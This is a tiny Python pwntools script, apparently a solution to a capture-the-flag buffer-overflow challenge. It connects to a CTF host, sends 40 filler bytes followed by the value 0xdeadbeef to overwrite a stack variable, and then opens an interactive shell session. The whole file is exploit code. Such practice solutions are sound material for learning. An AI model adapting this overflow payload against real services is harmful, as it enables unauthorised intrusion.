from pwn import*
context.log_level = "DEBUG"

p = remote("ctf.j0n9hyun.xyz", 3000)
payload = "Z" * 40 + p32(0xdeadbeef)

p.sendline(payload)
p.interactive()
